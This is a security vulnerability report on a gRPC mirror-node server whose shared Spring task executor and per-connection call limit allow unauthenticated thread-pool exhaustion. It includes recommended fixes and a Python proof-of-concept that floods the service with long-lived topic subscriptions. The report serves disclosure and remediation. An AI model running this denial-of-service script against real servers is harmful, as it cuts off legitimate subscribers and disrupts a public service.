### Title
Unbounded Multi-Connection Thread Exhaustion via Shared `applicationTaskExecutor` in gRPC Server

### Summary
`grpcServerConfigurer()` assigns Spring Boot's shared `applicationTaskExecutor` as the gRPC Netty server's call-dispatch executor and sets `maxConcurrentCallsPerConnection` to 5. This per-connection limit provides no global protection: an unauthenticated attacker can open an arbitrary number of TCP connections, each holding 5 long-lived streaming RPCs, exhausting the shared executor's thread pool and starving all other clients — including those receiving gossip-related topic-message streams.

### Finding Description
**Code location:** `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35.

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);                                    // shared Spring executor
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default = 5, per-connection only
};
```

`NettyProperties.maxConcurrentCallsPerConnection` defaults to 5 (`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14). No `maxConnections`, `maxConnectionsPerIp`, or global call limit is set on the `NettyServerBuilder`.

`applicationTaskExecutor` is Spring Boot's default `ThreadPoolTaskExecutor` (core size 8, max size `Integer.MAX_VALUE`, queue capacity `Integer.MAX_VALUE`). When gRPC-Java dispatches an incoming RPC call, it submits a `Runnable` to this executor. For long-lived server-streaming RPCs (e.g., `subscribeToTopic`), the dispatched task holds a thread for the duration of the stream.

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection = 5` bounds total executor load. It does not — it is enforced per HTTP/2 connection, and there is no limit on the number of connections a single client may open.

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (no authentication, no IP-level connection cap).
2. On each connection, attacker initiates 5 concurrent `subscribeToTopic` streaming calls with a far-future `consensusStartTime`, causing the server to enter a long-polling/streaming loop.
3. Each call is dispatched to `applicationTaskExecutor`, occupying one of its threads.
4. With N ≥ 2 connections (10 tasks), all 8 core threads are saturated; further tasks queue unboundedly.
5. Legitimate clients' streaming RPCs are queued indefinitely — they receive no topic messages.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` is per-connection; N connections multiply the load by N.
- No `serverBuilder.maxConnections(...)` or per-IP limit is configured.
- The gRPC interceptor (`GrpcInterceptor`) only sets an endpoint context label — no authentication or rate-limiting.
- No separate, bounded executor is dedicated to gRPC; the shared `applicationTaskExecutor` is also used by `@Async` Spring methods, compounding contention.

### Impact Explanation
An attacker can fully deny service to all legitimate subscribers of the consensus topic-message streaming API (the primary gossip-propagation surface). With the executor saturated, no new streaming RPCs can be dispatched, and queued legitimate calls experience unbounded latency. This is a complete availability loss for the gRPC service, achievable with a small number of connections (tens, not thousands).

### Likelihood Explanation
The gRPC port (5600) is publicly exposed (confirmed in Helm chart gateway rules). No authentication is required to open a streaming subscription. The attack requires only a standard gRPC client library and the ability to open multiple TCP connections — trivially achievable by any internet-accessible attacker. The attack is repeatable and persistent as long as the attacker maintains open connections.

### Recommendation
1. **Set a global connection limit** on the `NettyServerBuilder`:
   ```java
   serverBuilder.maxConnectionsPerIp(nettyProperties.getMaxConnectionsPerIp());
   // or serverBuilder.maxConnections(nettyProperties.getMaxConnections());
   ```
   Add `maxConnectionsPerIp` and/or `maxConnections` to `NettyProperties` with safe defaults (e.g., 10 per IP).

2. **Use a dedicated, bounded executor for gRPC** instead of the shared `applicationTaskExecutor`:
   ```java
   var grpcExecutor = new ThreadPoolExecutor(coreSize, maxSize, 60L, TimeUnit.SECONDS,
       new LinkedBlockingQueue<>(queueCapacity),
       new ThreadPoolExecutor.CallerRunsPolicy());
   serverBuilder.executor(grpcExecutor);
   ```
   This isolates gRPC thread consumption from other application async tasks.

3. **Add a server-side interceptor** that enforces per-IP or per-identity call rate limits before dispatching to the executor.

### Proof of Concept
```python
import grpc
import threading
from concurrent import futures
# proto stubs for ConsensusService

TARGET = "mirror-node-grpc:5600"
NUM_CONNECTIONS = 20  # 20 connections × 5 calls = 100 executor tasks

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = ConsensusServiceStub(channel)
    streams = []
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        req = ConsensusTopicQuery(
            topicID=TopicID(topicNum=1),
            consensusStartTime=Timestamp(seconds=9999999999)  # far future → long-lived stream
        )
        streams.append(stub.subscribeTopic(req))
    # Hold streams open indefinitely
    for s in streams:
        for _ in s:
            pass

with futures.ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as pool:
    list(pool.map(flood_connection, range(NUM_CONNECTIONS)))
# Result: applicationTaskExecutor saturated; legitimate subscribers receive no messages
```